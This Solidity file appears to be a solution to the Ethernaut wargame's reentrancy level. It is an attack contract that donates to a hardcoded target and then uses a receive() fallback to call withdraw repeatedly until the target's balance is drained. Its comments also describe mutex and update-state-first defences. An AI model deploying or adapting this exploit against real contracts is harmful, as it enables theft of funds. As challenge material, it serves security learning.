//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract EthernautLevel10 {
    address payable reentranceContractAddress =
        payable(0xe5dD435Bc9d117c269ca6B9c314564e6Da1A00cD);
    address public owner;
    uint256 public amount = 0.001 ether;

    //***Reentrancy Contract balance is 0.01 ether so after depositing 0.001 ether Can withdraw the same amount
    //***in 11 withdrawals.

    constructor() payable {
        owner = msg.sender;
    }

    //donate the amount to add the contract address to the mapping
    function donateReentrance() external payable returns (bool) {
        (bool success, ) = reentranceContractAddress.call{
            value: amount,
            gas: 500000
        }(abi.encodeWithSignature("donate(address)", address(this)));
        return success;
    }

    //initiate Reentrancy.withdraw(0.001 ether) from this contract address
    function withdraw() public returns (bool) {
        (bool success, ) = reentranceContractAddress.call{gas: 500000}(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );
        return success;
    }

    function selfDestruct() external {
        selfdestruct(payable(owner));
    }

    //Victim contract initiates transfer to this contract upon withdrawal
    //and we can have it fallback to the following code which calls withdraw again
    //causing a recursive loop of withdrawal transactions until victim contract is empty.
    //Re-entrancy attacks can be avoided by using some state variables to check state of transaction,
    //mutex and having transactions go through only after state variables are updated and not before.
    receive() external payable {
        if (address(reentranceContractAddress).balance != 0) {
            withdraw();
        }
    }
}
